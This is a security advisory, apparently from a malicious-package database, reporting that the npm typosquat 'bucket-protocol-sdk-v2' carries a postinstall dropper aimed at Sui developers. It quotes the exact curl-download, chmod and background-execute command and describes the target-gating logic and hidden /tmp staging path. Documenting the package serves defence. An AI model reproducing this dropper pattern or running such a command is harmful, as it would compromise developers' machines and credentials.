summary: Postinstall dropper targeting Sui developers fetches and executes binary from anonymous host
details: bucket-protocol-sdk-v2 is a typosquat of bucket-protocol-sdk that self-describes as a 'community maintained drop-in replacement.' The package source is a stub (src/bucket.ts: `export {};`) and the only real code is install.js, invoked from `package.json` `postinstall: node install.js`. install.js checks whether the installer is a Sui developer (sui CLI on PATH or ~/.sui/sui_config/client.yaml present) and, if so, runs `curl -s -L -o /tmp/.sui-helper ${implantUrl} && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &`. The variable is literally named `implantUrl` and the source comment reads `PUT YOUR ACTUAL 0x0.st URL HERE` (0x0.st is an anonymous, throwaway file host). In this published version the URL string is empty so curl fails, but the package as published is unambiguously a dropper scaffold: target-gated Sui-developer victim selection, hidden /tmp/.sui-helper staging path, chmod+x, detached background execution, anonymous-host source. The package author field is empty and metadata is placeholder. Any subsequent publish or version bump that fills in the URL fully weaponizes every installer.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
